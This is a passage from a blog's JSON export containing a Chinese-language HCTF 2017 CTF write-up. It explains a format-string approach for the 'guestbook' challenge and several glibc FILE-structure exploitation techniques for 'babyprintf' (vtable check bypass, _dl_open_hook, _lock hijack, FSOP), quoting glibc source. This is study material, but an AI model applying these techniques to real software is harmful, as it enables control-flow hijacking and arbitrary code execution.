class=\"number\">192.168</span><span class=\"number\">.234</span><span class=\"number\">.1</span></div><div class=\"line\"></div><div class=\"line\">######################################################</div><div class=\"line\"># ignore SIGALRM</div><div class=\"line\"># handle SIGALRM ignore</div><div class=\"line\"></div><div class=\"line\">#######################################################</div><div class=\"line\">define p32break</div><div class=\"line\">\tbreak * <span class=\"number\">0x56555000</span> + $arg0</div><div class=\"line\">end</div><div class=\"line\"></div><div class=\"line\">document p32break</div><div class=\"line\">\tbreak when PIE is on</div><div class=\"line\">end</div><div class=\"line\"></div><div class=\"line\">########################################################</div><div class=\"line\">define p32telescope</div><div class=\"line\">\ttelescope <span class=\"number\">0x56555000</span>+$arg0 $arg1</div><div class=\"line\">end</div><div class=\"line\"></div><div class=\"line\">document p32telescope</div><div class=\"line\">\ttelescope when PIE is on</div><div class=\"line\">end</div><div class=\"line\"></div><div class=\"line\">#######################################################</div><div class=\"line\">source aa</div><div class=\"line\">define ssa</div><div class=\"line\">    session save aa</div><div class=\"line\">end</div></pre></td></tr></table></figure>\n<h2 id=\"100levels\"><a href=\"#100levels\" class=\"headerlink\" title=\"100levels\"></a>100levels</h2>"},{"title":"2017HCTF赛后整理","date":"2017-11-13T12:59:49.000Z","_content":"\n## level 1\n\n### Evr_Q\n\n一个基本的逆向，但是有点麻烦。。\n参考资料:\n[反调试技巧总结-原理和实现(1)(2)(3)(4)(5)(6)......](https://bbs.pediy.com/thread-70470.htm)\n[反调试技巧总结-原理和实现](http://www.cppblog.com/xunbu7/archive/2013/01/05/196963.html)\n[简单解释Windows如何使用FS段寄存器](https://bbs.pediy.com/thread-159935.htm)\n[PE中的aslr](https://www.cnblogs.com/dliv3/p/6411814.html)\n[TLS回调函数](https://www.cnblogs.com/dliv3/p/6489629.html)\n[一种基于TLS的高级反调试技术](http://blog.csdn.net/fengyunzhongwei/article/details/29382945)\n\n\n## level 2\n\n### guestbook\n\n格式化字符串可解决，但是我在`(*_ctype_b_loc())[*(phonePtr_3064[10 * v1] + j)] & 0x400 )`上卡了很久，后来搜索才知道是`__isctype`的宏展开。\n\n```\n# include <endian.h>\n# if __BYTE_ORDER == __BIG_ENDIAN\n#  define _ISbit(bit)\t(1 << (bit))\n# else /* __BYTE_ORDER == __LITTLE_ENDIAN */\n#  define _ISbit(bit)\t((bit) < 8 ? ((1 << (bit)) << 8) : ((1 << (bit)) >> 8))\n# endif\n\nenum\n{\n  _ISupper = _ISbit (0),\t/* UPPERCASE.  */\n  _ISlower = _ISbit (1),\t/* lowercase.  */\n  _ISalpha = _ISbit (2),\t/* Alphabetic.  */\n  _ISdigit = _ISbit (3),\t/* Numeric.  */\n  _ISxdigit = _ISbit (4),\t/* Hexadecimal numeric.  */\n  _ISspace = _ISbit (5),\t/* Whitespace.  */\n  _ISprint = _ISbit (6),\t/* Printing.  */\n  _ISgraph = _ISbit (7),\t/* Graphical.  */\n  _ISblank = _ISbit (8),\t/* Blank (usually SPC and TAB).  */\n  _IScntrl = _ISbit (9),\t/* Control character.  */\n  _ISpunct = _ISbit (10),\t/* Punctuation.  */\n  _ISalnum = _ISbit (11)\t/* Alphanumeric.  */\n};\n..........\n..........\n# define __isctype(c, type) \\\n  ((*__ctype_b_loc ())[(int) (c)] & (unsigned short int) type)\n```\n\n后来我把对应的16进制打印了一下\n```\n#include <stdio.h>\n#include <ctype.h>\n\nint main()\n{\n\tfor(int i = 0; i < 12; i++)\n\t{\n\t\tprintf(\"%-4d, %04x\\n\", i, _ISbit(i));\n\t\t/*\n\t\t * 0   , 0100\n\t\t * 1   , 0200\n\t\t * 2   , 0400\n\t\t * 3   , 0800\n\t\t * 4   , 1000\n\t\t * 5   , 2000\n\t\t * 6   , 4000\n\t\t * 7   , 8000\n\t\t * 8   , 0001\n\t\t * 9   , 0002\n\t\t * 10  , 0004\n\t\t * 11  , 0008\n\t\t * /\n\t}\n\treturn 0;\n}\n```\n所以程序中的代码就是检查是否是字母或whitespace。\n\n```\n      for ( j = 0; j <= 15; ++j )\n      {\n        if ( (*_ctype_b_loc())[*(phonePtr_3064[10 * v1] + j)] & 0x400 )// Alphabetic\n        {\n          puts(\"I dont trust your phone number!\");\n          goto LABEL_11;\n        }\n        if ( (*_ctype_b_loc())[*(phonePtr_3064[10 * v1] + j)] & 0x2000 )// Whitespace\n        {\n          puts(\"I dont trust your phone number!\");\n          goto LABEL_11;\n        }\n```\n\n所以先泄露elf基址和canary，然后改`__free_hook`到一个可以构造栈溢出的地方即可。\n\n**看了一下wp，`system(\"$0\")`也能拿到shell**，还不道为什么，环境变量？\n\n<!-- more -->\n\n### babyprintf\n\n先简单理解一下`FILE`结构体，参看了这篇[slide](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique)\n`File stream`结构体可以看作`read`和`write`的一个封装，`FILE`结构体是`File stream`的一个主要结构体，其内部实现了一个流输入输出的缓冲区，用以减少系统调用的次数。\n\n```\nstruct _IO_FILE {\n  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n \n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;        /* Current read pointer */\n  char* _IO_read_end;        /* End of get area. */\n  char* _IO_read_base;        /* Start of putback+get area. */\n  char* _IO_write_base;        /* Start of put area. */\n  char* _IO_write_ptr;        /* Current put pointer. */\n  char* _IO_write_end;        /* End of put area. */\n  char* _IO_buf_base;        /* Start of reserve area. */\n  char* _IO_buf_end;        /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n \n  struct _IO_marker *_markers;\n \n  struct _IO_FILE *_chain;\n \n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */\n \n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n \n  /*  char* _save_gptr;  char* _save_egptr; */\n \n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n```\n\n这里的几个buffer需要注意一下，这里就是我们的`FILE_buffer`的地址。\n还有个`FILE_plus`的结构体，包含了一个虚表\n\n```\n/* We always allocate an extra word following an _IO_FILE.\n   This contains a pointer to the function jump table used.\n   This is for compatibility with C++ streambuf; the word can\n   be used to smash to a pointer to a virtual function table. */\n \nstruct _IO_FILE_plus\n{\n  _IO_FILE file;\n  const struct _IO_jump_t *vtable;\n};\n```\n\n+ Flags\n\t+ 文件的flag标志位，指示了file流的打开方式\n\n+ \\_fileno\n\t+ 文件描述符\n    + 由`sys_open`函数返回\n\n+ FILE plus\n\t+ 任何的操作都是通过这个表\n\n```\nstruct _IO_jump_t\n{\n    JUMP_FIELD(size_t, __dummy);\n    JUMP_FIELD(size_t, __dummy2);\n    JUMP_FIELD(_IO_finish_t, __finish);\n    JUMP_FIELD(_IO_overflow_t, __overflow);\n    JUMP_FIELD(_IO_underflow_t, __underflow);\n    JUMP_FIELD(_IO_underflow_t, __uflow);\n    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);\n    /* showmany */\n    JUMP_FIELD(_IO_xsputn_t, __xsputn);\n    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);\n    JUMP_FIELD(_IO_seekoff_t, __seekoff);\n    JUMP_FIELD(_IO_seekpos_t, __seekpos);\n    JUMP_FIELD(_IO_setbuf_t, __setbuf);\n    JUMP_FIELD(_IO_sync_t, __sync);\n    JUMP_FIELD(_IO_doallocate_t, __doallocate);\n    JUMP_FIELD(_IO_read_t, __read);\n    JUMP_FIELD(_IO_write_t, __write);\n    JUMP_FIELD(_IO_seek_t, __seek);\n    JUMP_FIELD(_IO_close_t, __close);\n    JUMP_FIELD(_IO_stat_t, __stat);\n    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);\n    JUMP_FIELD(_IO_imbue_t, __imbue);\n#if 0\n    get_column;\n    set_column;\n#endif\n};\n```\n\n+ `struct _IO_FILE *_chain`\n\t+ 所有的`FILE`结构体都是通过一个单项链表连接起来的\n    + ![](1.png)\n\n\n```\n_IO_FILE *\n__fopen_internal (const char *filename, const char *mode, int is32)\n{\n  struct locked_FILE\n  {\n    struct _IO_FILE_plus fp;\n#ifdef _IO_MTSAFE_IO\n    _IO_lock_t lock;\n#endif\n    struct _IO_wide_data wd;\n  } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));\n \n  if (new_f == NULL)\n    return NULL;\n#ifdef _IO_MTSAFE_IO\n  new_f->fp.file._lock = &new_f->lock;\n#endif\n  _IO_no_init (&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps);\n  _IO_JUMPS (&new_f->fp) = &_IO_file_jumps;\n  _IO_new_file_init_internal (&new_f->fp);\n#if  !_IO_UNIFIED_JUMPTABLES\n  new_f->fp.vtable = NULL;\n#endif\n  if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)\n    return __fopen_maybe_mmap (&new_f->fp.file);\n \n  _IO_un_link (&new_f->fp);\n  free (new_f);\n  return NULL;\n}\n \n_IO_FILE *\n_IO_new_fopen (const char *filename, const char *mode)\n{\n  return __fopen_internal (filename, mode, 1);\n}\n \nstrong_alias (_IO_new_fopen, __new_fopen)\nversioned_symbol (libc, _IO_new_fopen, _IO_fopen, GLIBC_2_1);\nversioned_symbol (libc, __new_fopen, fopen, GLIBC_2_1);\n\t```\n\n+ `fopen`\n\t+ ![](2.png)\n    + ![](3.png)\n    + 链入链表头\n\n+ fread\n\t+ ![](4.png)\n    \n+ fwrite\n\t+ ![](5.png)\n\n+ fclose\n\t+ ![](6.png)\n\n主要逻辑和fopen差不多，不再细表。\n\n看一下`FILE`在2.24之后出现的check\n\n主要是对vtable的合法性进行检查\n\n```\n/* Perform vtable pointer validation.  If validation fails, terminate\n   the process.  */\nstatic inline const struct _IO_jump_t *\nIO_validate_vtable (const struct _IO_jump_t *vtable)\n{\n  /* Fast path: The vtable pointer is within the __libc_IO_vtables\n     section.  */\n  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;\n  const char *ptr = (const char *) vtable;\n  uintptr_t offset = ptr - __start___libc_IO_vtables;\n  if (__glibc_unlikely (offset >= section_length))\n    /* The vtable pointer is not in the expected section.  Use the\n       slow path, which will terminate the process if necessary.  */\n    _IO_vtable_check ();\n  return vtable;\n}\n```\n\n看注释可以得出，如果vtable的指针没有落在`__libc_IO_vatbles`的节中，那么就会进行`_IO_vtable_check`的检查\n\n```\nvoid attribute_hidden\n_IO_vtable_check (void)\n{\n#ifdef SHARED\n  /* Honor the compatibility flag.  */\n  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);\n#ifdef PTR_DEMANGLE\n  PTR_DEMANGLE (flag);\n#endif\n  if (flag == &_IO_vtable_check)\n    return;\n \n  /* In case this libc copy is in a non-default namespace, we always\n     need to accept foreign vtables because there is always a\n     possibility that FILE * objects are passed across the linking\n     boundary.  */\n  {\n    Dl_info di;\n    struct link_map *l;\n    if (_dl_open_hook != NULL\n        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0\n            && l->l_ns != LM_ID_BASE))\n      return;\n  }\n \n#else /* !SHARED */\n  /* We cannot perform vtable validation in the static dlopen case\n     because FILE * handles might be passed back and forth across the\n     boundary.  Therefore, we disable checking in this case.  */\n  if (__dlopen != NULL)\n    return;\n#endif\n \n  __libc_fatal (\"Fatal error: glibc detected an invalid stdio handle\\n\");\n}\n```\n\n主要检查了三种情况，如果这三种情况都不满足的话，那么就说明vtable已经被改变过了。\n\n我们看到两个地方可以通过检查\n\n![](7.png)\n\n第一个地方因为有指针检查所以很难bypass\n第二处需要我们overwrite`_dl_open_hook`，这个指针是一个有三个函数的结构体\n\n```\n/* This code is to support __libc_dlopen from __libc_dlopen'ed shared\n   libraries.  We need to ensure the statically linked __libc_dlopen\n   etc. functions are used instead of the dynamically loaded.  */\nstruct dl_open_hook\n{\n  void *(*dlopen_mode) (const char *name, int mode);\n  void *(*dlsym) (void *map, const char *name);\n  int (*dlclose) (void *map);\n};\n```\n\n#### exp 0x00\n\n档不能伪造vtable的时候，发现可以直接使用原先_vtable_jmp的函数``JUMP_INIT(overflow, _IO_str_overflow)\n\n```\nconst struct _IO_jump_t _IO_str_jumps libio_vtable =\n{\n  JUMP_INIT_DUMMY,\n  JUMP_INIT(finish, _IO_str_finish),\n  JUMP_INIT(overflow, _IO_str_overflow),\n  JUMP_INIT(underflow, _IO_str_underflow),\n  JUMP_INIT(uflow, _IO_default_uflow),\n  JUMP_INIT(pbackfail, _IO_str_pbackfail),\n  JUMP_INIT(xsputn, _IO_default_xsputn),\n  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n  JUMP_INIT(seekoff, _IO_str_seekoff),\n  JUMP_INIT(seekpos, _IO_default_seekpos),\n  JUMP_INIT(setbuf, _IO_default_setbuf),\n  JUMP_INIT(sync, _IO_default_sync),\n  JUMP_INIT(doallocate, _IO_default_doallocate),\n  JUMP_INIT(read, _IO_default_read),\n  JUMP_INIT(write, _IO_default_write),\n  JUMP_INIT(seek, _IO_default_seek),\n  JUMP_INIT(close, _IO_default_close),\n  JUMP_INIT(stat, _IO_default_stat),\n  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n  JUMP_INIT(imbue, _IO_default_imbue)\n};\n```\n\n这个`_IO_str_overflow`的源码中有`new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);`这样一句，由于我们是可以控制`fp`的，所以我们伪造`fp->_s._allocate_buffer`这个偏移的函数即可控制一次rip。\n\n```\nint\n_IO_str_overflow (_IO_FILE *fp, int c)\n{\n  int flush_only = c == EOF;\n  _IO_size_t pos;\n  if (fp->_flags & _IO_NO_WRITES)\n      return flush_only ? 0 : EOF;\n  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))\n    {\n      fp->_flags |= _IO_CURRENTLY_PUTTING;\n      fp->_IO_write_ptr = fp->_IO_read_ptr;\n      fp->_IO_read_ptr = fp->_IO_read_end;\n    }\n  pos = fp->_IO_write_ptr - fp->_IO_write_base;\n  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))\n    {\n      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */\n        return EOF;\n      else\n        {\n          char *new_buf;\n          char *old_buf = fp->_IO_buf_base;\n          size_t old_blen = _IO_blen (fp);\n          _IO_size_t new_size = 2 * old_blen + 100;\n          if (new_size < old_blen)\n            return EOF;\n          new_buf\n            = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);\n          if (new_buf == NULL)\n            {\n              /*          __ferror(fp) = 1; */\n              return EOF;\n            }\n          if (old_buf)\n            {\n              memcpy (new_buf, old_buf, old_blen);\n              (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);\n              /* Make sure _IO_setb won't try to delete _IO_buf_base. */\n              fp->_IO_buf_base = NULL;\n            }\n          memset (new_buf + old_blen, '\\0', new_size - old_blen);\n \n          _IO_setb (fp, new_buf, new_buf + new_size, 1);\n          fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);\n          fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);\n          fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);\n          fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);\n \n          fp->_IO_write_base = new_buf;\n          fp->_IO_write_end = fp->_IO_buf_end;\n        }\n    }\n \n  if (!flush_only)\n    *fp->_IO_write_ptr++ = (unsigned char) c;\n  if (fp->_IO_write_ptr > fp->_IO_read_end)\n    fp->_IO_read_end = fp->_IO_write_ptr;\n  return c;\n}\nlibc_hidden_def (_IO_str_overflow)\n```\n\n#### exp 0x01\n\n再看下`dl_open_hook`这个指针，似乎是在有其他hook_so的时候使用的，在检查`_dl_open_hook`是否为空之后，会进行`_vtable_check`然后调用`dlopen_mode`这个函数指针处，这个结构体我们可以伪造，接着就得到一次控制rip的机会。\n\n#### exp 0x02\n\n@angelboy下面提供了一种思路，通过`_fileno`和`_IO_buffer`来进行任意地址读写，原理也容易理解，当我们可以控制`_IO_buffer`的指针时，就可以适当的设置缓冲区地址到我们的目标地址即可。\n\n+ Arbitrary memory reading\n\t+ ![](9.png)\n+ Arbitrary memory writing\n\t+ ![](8.png)\n\n#### exp 0x03\n\n以及whctf那种利用unsortbins attack（main_arena）的（因为libc中stdin下面就是main_arena，可以一直覆盖到，只需要将`_IO_buf_end`改写到后面即可）\n\n#### exp 0x04\n\n利用`_IO_lock_t *_lock`这个结构来控制rip。\n\n```\ntypedef struct { int lock; int cnt; void *owner; } _IO_lock_t;\n.....\n.....\nstruct _IO_FILE {\n......\n  _IO_lock_t *_lock;\n.....\n};\n```\n这个是2.24的版本，直接控制这个结构体的指针即可。\n其调用的源码是\n\n```\nint\n_IO_new_fclose (_IO_FILE *fp)\n{\n...\n  _IO_acquire_lock (fp);\n  if (fp->_IO_file_flags & _IO_IS_FILEBUF)\n    status = _IO_file_close_it (fp);\n}\n```\n我们把这个`_lock`结构体指向一个可以控制的地方，rip就会跳到`call *(_lock+0x10)`，可以控制rip。\n\n#### exp 0x05 FSOP\n\nFSOP\n\n这个主要就是利用`chain`这个字段，档我们调用\n\n+ Glibc abort routine\n+ exit\n+ main return\n\n时，`_IO_flush_all_lockp`就会被调用，然后fflush all stream\n\n```\nint\n_IO_flush_all_lockp (int do_lock)\n{\n  int result = 0;\n  struct _IO_FILE *fp;\n \n#ifdef _IO_MTSAFE_IO\n  _IO_cleanup_region_start_noarg (flush_cleanup);\n  _IO_lock_lock (list_all_lock);\n#endif\n \n  for (fp = (_IO_FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)\n    {\n      run_fp = fp;\n      if (do_lock)\n        _IO_flockfile (fp);\n \n      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)\n           || (_IO_vtable_offset (fp) == 0\n               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr\n                                    > fp->_wide_data->_IO_write_base))\n           )\n          && _IO_OVERFLOW (fp, EOF) == EOF)     // Trigger virtual funcation\n...\n \n  return result;\n}\n```\n\n当我们修改`chain`的时候，将其控制到我们可写的一个地方，然后可以选择0x00的方法直接getshell，也可以选择两个或多个`FILE`结构体来完成rop（但是感觉好鸡肋，要没有_vtable_check，而且在可以控制一次rip的情况下可以跳到很多地方去）\n\n## level 3\n\n## level 4\n\n## level 5","source":"_posts/2017HCTF赛后整理.md","raw":"---\ntitle: 2017HCTF赛后整理\ntags:\n  - PWN\ncategories: []\ndate: 2017-11-13 20:59:49\n---\n\n## level 1\n\n### Evr_Q\n\n一个基本的逆向，但是有点麻烦。。\n参考资料:\n[反调试技巧总结-原理和实现(1)(2)(3)(4)(5)(6)......](https://bbs.pediy.com/thread-70470.htm)\n[反调试技巧总结-原理和实现](http://www.cppblog.com/xunbu7/archive/2013/01/05/196963.html)\n[简单解释Windows如何使用FS段寄存器](https://bbs.pediy.com/thread-159935.htm)\n[PE中的aslr](https://www.cnblogs.com/dliv3/p/6411814.html)\n[TLS回调函数](https://www.cnblogs.com/dliv3/p/6489629.html)\n[一种基于TLS的高级反调试技术](http://blog.csdn.net/fengyunzhongwei/article/details/29382945)\n\n\n## level 2\n\n### guestbook\n\n格式化字符串可解决，但是我在`(*_ctype_b_loc())[*(phonePtr_3064[10 * v1] + j)] & 0x400 )`上卡了很久，后来搜索才知道是`__isctype`的宏展开。\n\n```\n# include <endian.h>\n# if __BYTE_ORDER == __BIG_ENDIAN\n#  define _ISbit(bit)\t(1 << (bit))\n# else /* __BYTE_ORDER == __LITTLE_ENDIAN */\n#  define _ISbit(bit)\t((bit) < 8 ? ((1 << (bit)) << 8) : ((1 << (bit)) >> 8))\n# endif\n\nenum\n{\n  _ISupper = _ISbit (0),\t/* UPPERCASE.  */\n  _ISlower = _ISbit (1),\t/* lowercase.  */\n  _ISalpha = _ISbit (2),\t/* Alphabetic.  */\n  _ISdigit = _ISbit (3),\t/* Numeric.  */\n  _ISxdigit = _ISbit (4),\t/* Hexadecimal numeric.  */\n  _ISspace = _ISbit (5),\t/* Whitespace.  */\n  _ISprint = _ISbit (6),\t/* Printing.  */\n  _ISgraph = _ISbit (7),\t/* Graphical.  */\n  _ISblank = _ISbit (8),\t/* Blank (usually SPC and TAB).  */\n  _IScntrl = _ISbit (9),\t/* Control character.  */\n  _ISpunct = _ISbit (10),\t/* Punctuation.  */\n  _ISalnum = _ISbit (11)\t/* Alphanumeric.  */\n};\n..........\n..........\n# define __isctype(c, type) \\\n  ((*__ctype_b_loc ())[(int) (c)] & (unsigned short int) type)\n```\n\n后来我把对应的16进制打印了一下\n```\n#include <stdio.h>\n#include <ctype.h>\n\nint main()\n{\n\tfor(int i = 0; i < 12; i++)\n\t{\n\t\tprintf(\"%-4d, %04x\\n\", i, _ISbit(i));\n\t\t/*\n\t\t * 0   , 0100\n\t\t * 1   , 0200\n\t\t * 2   , 0400\n\t\t * 3   , 0800\n\t\t * 4   , 1000\n\t\t * 5   , 2000\n\t\t * 6   , 4000\n\t\t * 7   , 8000\n\t\t * 8   , 0001\n\t\t * 9   , 0002\n\t\t * 10  , 0004\n\t\t * 11  , 0008\n\t\t * /\n\t}\n\treturn 0;\n}\n```\n所以程序中的代码就是检查是否是字母或whitespace。\n\n```\n      for ( j = 0; j <= 15; ++j )\n      {\n        if ( (*_ctype_b_loc())[*(phonePtr_3064[10 * v1] + j)] & 0x400 )// Alphabetic\n        {\n          puts(\"I dont trust your phone number!\");\n          goto LABEL_11;\n        }\n        if ( (*_ctype_b_loc())[*(phonePtr_3064[10 * v1] + j)] & 0x2000 )// Whitespace\n        {\n          puts(\"I dont trust your phone number!\");\n          goto LABEL_11;\n        }\n```\n\n所以先泄露elf基址和canary，然后改`__free_hook`到一个可以构造栈溢出的地方即可。\n\n**看了一下wp，`system(\"$0\")`也能拿到shell**，还不道为什么，环境变量？\n\n<!-- more -->\n\n### babyprintf\n\n先简单理解一下`FILE`结构体，参看了这篇[slide](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique)\n`File stream`结构体可以看作`read`和`write`的一个封装，`FILE`结构体是`File stream`的一个主要结构体，其内部实现了一个流输入输出的缓冲区，用以减少系统调用的次数。\n\n```\nstruct _IO_FILE {\n  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n \n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;        /* Current read pointer */\n  char* _IO_read_end;        /* End of get area. */\n  char* _IO_read_base;        /* Start of putback+get area. */\n  char* _IO_write_base;        /* Start of put area. */\n  char* _IO_write_ptr;        /* Current put pointer. */\n  char* _IO_write_end;        /* End of put area. */\n  char* _IO_buf_base;        /* Start of reserve area. */\n  char* _IO_buf_end;        /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n \n  struct _IO_marker *_markers;\n \n  struct _IO_FILE *_chain;\n \n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */\n \n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n \n  /*  char* _save_gptr;  char* _save_egptr; */\n \n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n```\n\n这里的几个buffer需要注意一下，这里就是我们的`FILE_buffer`的地址。\n还有个`FILE_plus`的结构体，包含了一个虚表\n\n```\n/* We always allocate an extra word following an _IO_FILE.\n   This contains a pointer to the function jump table used.\n   This is for compatibility with C++ streambuf; the word can\n   be used to smash to a pointer to a virtual function table. */\n \nstruct _IO_FILE_plus\n{\n  _IO_FILE file;\n  const struct _IO_jump_t *vtable;\n};\n```\n\n+ Flags\n\t+ 文件的flag标志位，指示了file流的打开方式\n\n+ \\_fileno\n\t+ 文件描述符\n    + 由`sys_open`函数返回\n\n+ FILE plus\n\t+ 任何的操作都是通过这个表\n\n```\nstruct _IO_jump_t\n{\n    JUMP_FIELD(size_t, __dummy);\n    JUMP_FIELD(size_t, __dummy2);\n    JUMP_FIELD(_IO_finish_t, __finish);\n    JUMP_FIELD(_IO_overflow_t, __overflow);\n    JUMP_FIELD(_IO_underflow_t, __underflow);\n    JUMP_FIELD(_IO_underflow_t, __uflow);\n    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);\n    /* showmany */\n    JUMP_FIELD(_IO_xsputn_t, __xsputn);\n    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);\n    JUMP_FIELD(_IO_seekoff_t, __seekoff);\n    JUMP_FIELD(_IO_seekpos_t, __seekpos);\n    JUMP_FIELD(_IO_setbuf_t, __setbuf);\n    JUMP_FIELD(_IO_sync_t, __sync);\n    JUMP_FIELD(_IO_doallocate_t, __doallocate);\n    JUMP_FIELD(_IO_read_t, __read);\n    JUMP_FIELD(_IO_write_t, __write);\n    JUMP_FIELD(_IO_seek_t, __seek);\n    JUMP_FIELD(_IO_close_t, __close);\n    JUMP_FIELD(_IO_stat_t, __stat);\n    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);\n    JUMP_FIELD(_IO_imbue_t, __imbue);\n#if 0\n    get_column;\n    set_column;\n#endif\n};\n```\n\n+ `struct _IO_FILE *_chain`\n\t+ 所有的`FILE`结构体都是通过一个单项链表连接起来的\n    + ![](1.png)\n\n\n```\n_IO_FILE *\n__fopen_internal (const char *filename, const char *mode, int is32)\n{\n  struct locked_FILE\n  {\n    struct _IO_FILE_plus fp;\n#ifdef _IO_MTSAFE_IO\n    _IO_lock_t lock;\n#endif\n    struct _IO_wide_data wd;\n  } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));\n \n  if (new_f == NULL)\n    return NULL;\n#ifdef _IO_MTSAFE_IO\n  new_f->fp.file._lock = &new_f->lock;\n#endif\n  _IO_no_init (&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps);\n  _IO_JUMPS (&new_f->fp) = &_IO_file_jumps;\n  _IO_new_file_init_internal (&new_f->fp);\n#if  !_IO_UNIFIED_JUMPTABLES\n  new_f->fp.vtable = NULL;\n#endif\n  if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)\n    return __fopen_maybe_mmap (&new_f->fp.file);\n \n  _IO_un_link (&new_f->fp);\n  free (new_f);\n  return NULL;\n}\n \n_IO_FILE *\n_IO_new_fopen (const char *filename, const char *mode)\n{\n  return __fopen_internal (filename, mode, 1);\n}\n \nstrong_alias (_IO_new_fopen, __new_fopen)\nversioned_symbol (libc, _IO_new_fopen, _IO_fopen, GLIBC_2_1);\nversioned_symbol (libc, __new_fopen, fopen, GLIBC_2_1);\n\t```\n\n+ `fopen`\n\t+ ![](2.png)\n    + ![](3.png)\n    + 链入链表头\n\n+ fread\n\t+ ![](4.png)\n    \n+ fwrite\n\t+ ![](5.png)\n\n+ fclose\n\t+ ![](6.png)\n\n主要逻辑和fopen差不多，不再细表。\n\n看一下`FILE`在2.24之后出现的check\n\n主要是对vtable的合法性进行检查\n\n```\n/* Perform vtable pointer validation.  If validation fails, terminate\n   the process.  */\nstatic inline const struct _IO_jump_t *\nIO_validate_vtable (const struct _IO_jump_t *vtable)\n{\n  /* Fast path: The vtable pointer is within the __libc_IO_vtables\n     section.  */\n  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;\n  const char *ptr = (const char *) vtable;\n  uintptr_t offset = ptr - __start___libc_IO_vtables;\n  if (__glibc_unlikely (offset >= section_length))\n    /* The vtable pointer is not in the expected section.  Use the\n       slow path, which will terminate the process if necessary.  */\n    _IO_vtable_check ();\n  return vtable;\n}\n```\n\n看注释可以得出，如果vtable的指针没有落在`__libc_IO_vatbles`的节中，那么就会进行`_IO_vtable_check`的检查\n\n```\nvoid attribute_hidden\n_IO_vtable_check (void)\n{\n#ifdef SHARED\n  /* Honor the compatibility flag.  */\n  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);\n#ifdef PTR_DEMANGLE\n  PTR_DEMANGLE (flag);\n#endif\n  if (flag == &_IO_vtable_check)\n    return;\n \n  /* In case this libc copy is in a non-default namespace, we always\n     need to accept foreign vtables because there is always a\n     possibility that FILE * objects are passed across the linking\n     boundary.  */\n  {\n    Dl_info di;\n    struct link_map *l;\n    if (_dl_open_hook != NULL\n        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0\n            && l->l_ns != LM_ID_BASE))\n      return;\n  }\n \n#else /* !SHARED */\n  /* We cannot perform vtable validation in the static dlopen case\n     because FILE * handles might be passed back and forth across the\n     boundary.  Therefore, we disable checking in this case.  */\n  if (__dlopen != NULL)\n    return;\n#endif\n \n  __libc_fatal (\"Fatal error: glibc detected an invalid stdio 